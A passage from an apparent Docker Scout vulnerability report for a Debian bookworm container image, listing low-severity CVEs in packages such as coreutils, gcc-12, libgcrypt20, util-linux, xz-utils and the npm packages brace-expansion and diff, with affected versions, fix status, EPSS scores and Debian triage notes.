In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX "-R -L" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.

---
- coreutils <unfixed> (unimportant)
http://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html
https://www.openwall.com/lists/oss-security/2018/01/04/3
Documentation patches proposed:
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00072.html
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00073.html
Neutralised by kernel hardening

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>lcms2</strong> <code>2.14-2</code> (deb)</summary>

<small><code>pkg:deb/debian/lcms2@2.14-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-29070?s=debian&n=lcms2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.14-2"><img alt="low : CVE--2025--29070" src="https://img.shields.io/badge/CVE--2025--29070-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.14-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.189%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability has been identified in thesmooth2() in cmsgamma.c in lcms2-2.16 which allows a remote attacker to cause a denial of service. NOTE: the Supplier disputes this because "this is not exploitable as this function is never called on normal color management, is there only as a helper for low-level programming and investigation."

---
- lcms2 <unfixed> (unimportant)
https://github.com/mm2/Little-CMS/issues/475
Fixed by: https://github.com/mm2/Little-CMS/commit/ec399d6879184e92a88c9099c60573f35e82e28b
Negligible security impact, affected fuction never called on normal color managment

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-29069?s=debian&n=lcms2&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D2.14-2"><img alt="low : CVE--2025--29069" src="https://img.shields.io/badge/CVE--2025--29069-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=2.14-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.092%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability has been identified in the lcms2-2.16. The vulnerability exists in the UnrollChunkyBytes function in cmspack.c, which is responsible for handling color space transformations.

---
https://github.com/mm2/Little-CMS/issues/476
Not considered an issue in src:lcms2 but in the fuzzer

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>gcc-12</strong> <code>12.2.0-14</code> (deb)</summary>

<small><code>pkg:deb/debian/gcc-12@12.2.0-14?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-4039?s=debian&n=gcc-12&ns=debian&t=deb&osn=debian&osv=12&vr=%3C12.2.0-14%2Bdeb12u1"><img alt="low : CVE--2023--4039" src="https://img.shields.io/badge/CVE--2023--4039-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><12.2.0-14+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>12.2.0-14+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.181%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains  that target AArch64 allows an attacker to exploit an existing buffer  overflow in dynamically-sized local variables in your application  without this being detected. This stack-protector failure only applies  to C99-style dynamically-sized local variables or those created using  alloca(). The stack-protector operates as intended for statically-sized  local variables.  The default behavior when the stack-protector  detects an overflow is to terminate your application, resulting in  controlled loss of availability. An attacker who can exploit a buffer  overflow without triggering the stack-protector might be able to change  program flow control to cause an uncontrolled loss of availability or to  go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.

---
- gcc-13 13.2.0-4 (unimportant)
- gcc-12 12.3.0-9 (unimportant)
[bookworm] - gcc-12 12.2.0-14+deb12u1
- gcc-11 11.4.0-4 (unimportant)
- gcc-10 10.5.0-3 (unimportant)
- gcc-9 9.5.0-6 (unimportant)
- gcc-8 <removed> (unimportant)
- gcc-7 <removed> (unimportant)
https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-x7ch-h5rf-w2mf
Not considered a security issue by GCC upstream
https://developer.arm.com/Arm%20Security%20Center/GCC%20Stack%20Protector%20Vulnerability%20AArch64

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-27943?s=debian&n=gcc-12&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D12.2.0-14%2Bdeb12u1"><img alt="low : CVE--2022--27943" src="https://img.shields.io/badge/CVE--2022--27943-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=12.2.0-14+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.155%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.

---
- gcc-12 <unfixed> (unimportant)
Negligible security impact
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105039

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>libgcrypt20</strong> <code>1.10.1-3</code> (deb)</summary>

<small><code>pkg:deb/debian/libgcrypt20@1.10.1-3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-2236?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.10.1-3"><img alt="low : CVE--2024--2236" src="https://img.shields.io/badge/CVE--2024--2236-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.10.1-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.222%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.

---
- libgcrypt20 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1065683)
https://bugzilla.redhat.com/show_bug.cgi?id=2268268
https://lists.gnupg.org/pipermail/gcrypt-devel/2024-March/005607.html
https://github.com/tomato42/marvin-toolkit/tree/master/example/libgcrypt
https://people.redhat.com/~hkario/marvin/
https://dev.gnupg.org/T7136
https://gitlab.com/redhat-crypto/libgcrypt/libgcrypt-mirror/-/merge_requests/17
Not in scope for libgcrypt security policy, work ongoing to add support in the protocol layer

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6829?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.10.1-3"><img alt="low : CVE--2018--6829" src="https://img.shields.io/badge/CVE--2018--6829-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.10.1-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.662%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

cipher/elgamal.c in Libgcrypt through 1.8.2, when used to encrypt messages directly, improperly encodes plaintexts, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for Libgcrypt's ElGamal implementation.

---
- libgcrypt20 <unfixed> (unimportant)
- libgcrypt11 <removed> (unimportant)
- gnupg1 <unfixed> (unimportant)
- gnupg <removed> (unimportant)
https://github.com/weikengchen/attack-on-libgcrypt-elgamal
https://github.com/weikengchen/attack-on-libgcrypt-elgamal/wiki
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004394.html
GnuPG uses ElGamal in hybrid mode only.
This is not a vulnerability in libgcrypt, but in an application using
it in an insecure manner, see also
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004401.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>util-linux</strong> <code>2.38.1-5</code> (deb)</summary>

<small><code>pkg:deb/debian/util-linux@2.38.1-5?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-28085?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.38.1-5%2Bdeb12u1"><img alt="low : CVE--2024--28085" src="https://img.shields.io/badge/CVE--2024--28085-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.38.1-5+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.38.1-5+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>11.917%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.

---
- util-linux 2.39.3-11 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067849)
https://www.openwall.com/lists/oss-security/2024/03/27/5
https://github.com/util-linux/util-linux/commit/404b0781f52f7c045ca811b2dceec526408ac253 (v2.40)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.38.1-5%2Bdeb12u3"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.38.1-5+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>brace-expansion</strong> <code>1.1.11</code> (npm)</summary>

<small><code>pkg:npm/brace-expansion@1.1.11</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D1.0.0%2C%3C%3D1.1.11"><img alt="low 1.3: CVE--2025--5889" src="https://img.shields.io/badge/CVE--2025--5889-lightgrey?label=low%201.3&labelColor=fce1a9"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0.0<br/><=1.1.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>1.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>subversion</strong> <code>1.14.2-4</code> (deb)</summary>

<small><code>pkg:deb/debian/subversion@1.14.2-4?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-46901?s=debian&n=subversion&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.14.2-4%2Bdeb12u1"><img alt="low : CVE--2024--46901" src="https://img.shields.io/badge/CVE--2024--46901-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.14.2-4+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.14.2-4+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>7.256%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Insufficient validation of filenames against control characters in Apache Subversion repositories served via mod_dav_svn allows authenticated users with commit access to commit a corrupted revision, leading to disruption for users of the repository.  All versions of Subversion up to and including Subversion 1.14.4 are affected if serving repositories via mod_dav_svn. Users are recommended to upgrade to version 1.14.5, which fixes this issue.  Repositories served via other access methods are not affected.

---
- subversion 1.14.5-1
[bookworm] - subversion 1.14.2-4+deb12u1
https://subversion.apache.org/security/CVE-2024-46901-advisory.txt

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openexr</strong> <code>3.1.5-5</code> (deb)</summary>

<small><code>pkg:deb/debian/openexr@3.1.5-5?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2017-14988?s=debian&n=openexr&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.1.5-5"><img alt="low : CVE--2017--14988" src="https://img.shields.io/badge/CVE--2017--14988-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.1.5-5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.377%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Header::readfrom in IlmImf/ImfHeader.cpp in OpenEXR 2.2.0 allows remote attackers to cause a denial of service (excessive memory allocation) via a crafted file that is accessed with the ImfOpenInputFile function in IlmImf/ImfCRgbaFile.cpp. NOTE: The maintainer and multiple third parties believe that this vulnerability isn't valid

---
- openexr <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=878551; unimportant)
https://github.com/openexr/openexr/issues/248
Issue in the use of openexr via ImageMagick, no real security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>apt</strong> <code>2.6.1</code> (deb)</summary>

<small><code>pkg:deb/debian/apt@2.6.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-3374?s=debian&n=apt&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.6.1"><img alt="low : CVE--2011--3374" src="https://img.shields.io/badge/CVE--2011--3374-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.6.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.509%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.

---
- apt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=642480)
Not exploitable in Debian, since no keyring URI is defined

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>xz-utils</strong> <code>5.4.1-0.2</code> (deb)</summary>

<small><code>pkg:deb/debian/xz-utils@5.4.1-0.2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-31115?s=debian&n=xz-utils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.4.1-1"><img alt="low : CVE--2025--31115" src="https://img.shields.io/badge/CVE--2025--31115-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.4.1-1</code></td></tr>
<tr><td>Fixed version</td><td><code>5.4.1-1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

XZ Utils provide a general-purpose data-compression library plus command-line tools. In XZ Utils 5.3.3alpha to 5.8.0, the multithreaded .xz decoder in liblzma has a bug where invalid input can at least result in a crash. The effects include heap use after free and writing to an address based on the null pointer plus an offset. Applications and libraries that use the lzma_stream_decoder_mt function are affected. The bug has been fixed in XZ Utils 5.8.1, and the fix has been committed to the v5.4, v5.6, v5.8, and master branches in the xz Git repository. No new release packages will be made from the old stable branches, but a standalone patch is available that applies to all affected releases.

---
- xz-utils 5.8.1-1
[bullseye] - xz-utils <not-affected> (Vulnerable code introduced later)
https://www.openwall.com/lists/oss-security/2025/04/03/1
https://tukaani.org/xz/threaded-decoder-early-free.html
https://github.com/tukaani-project/xz/security/advisories/GHSA-6cc8-p5mm-29w2

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>pixman</strong> <code>0.42.2-1</code> (deb)</summary>

<small><code>pkg:deb/debian/pixman@0.42.2-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-37769?s=debian&n=pixman&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.42.2-1"><img alt="low : CVE--2023--37769" src="https://img.shields.io/badge/CVE--2023--37769-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.42.2-1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

stress-test master commit e4c878 was discovered to contain a FPE vulnerability via the component combine_inner at /pixman-combine-float.c.

---
- pixman <unfixed> (unimportant)
https://gitlab.freedesktop.org/pixman/pixman/-/issues/76
Crash in test tool, no security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>jansson</strong> <code>2.14-2</code> (deb)</summary>

<small><code>pkg:deb/debian/jansson@2.14-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2020-36325?s=debian&n=jansson&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.14-2"><img alt="low : CVE--2020--36325" src="https://img.shields.io/badge/CVE--2020--36325-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.14-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.323%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Jansson through 2.13.1. Due to a parsing error in json_loads, there's an out-of-bounds read-access bug. NOTE: the vendor reports that this only occurs when a programmer fails to follow the API specification

---
- jansson <unfixed> (unimportant)
https://github.com/akheron/jansson/issues/548
Disputed security impact (only if programmer fails to follow API specifications)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>brace-expansion</strong> <code>2.0.1</code> (npm)</summary>

<small><code>pkg:npm/brace-expansion@2.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D2.0.0%2C%3C%3D2.0.1"><img alt="low 1.3: CVE--2025--5889" src="https://img.shields.io/badge/CVE--2025--5889-lightgrey?label=low%201.3&labelColor=fce1a9"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0.0<br/><=2.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.0.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>1.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>diff</strong> <code>5.1.0</code> (npm)</summary>

<small><code>pkg:npm/diff@5.1.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-24001?s=github&n=diff&t=npm&vr=%3E%3D5.0.0%2C%3C5.2.2"><img alt="low : CVE--2026--24001" src="https://img.shields.io/badge/CVE--2026--24001-lightgrey?label=low%20&labelColor=fce1a9"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=5.0.0<br/><5.2.2</code></td></tr>
<tr><td>Fixed version</td><td><code>5.2.2</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Attempting to parse a patch whose filename headers contain the line break characters `\r`, `\u2028`, or `\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.

Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).

The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.

Finally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its "leading garbage"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.

### Patches

All vulnerabilities described are fixed in v8.0.3.

### Workarounds

If using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\r`, `\u2028`, or `\u2029`.

### References

PR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649


### CVE Notes

Note that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>subversion</strong> <code>1.14.2-4+b2</code> (deb)</summary>

<small><code>pkg:deb/debian/subversion@1.14.2-4%2Bb2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
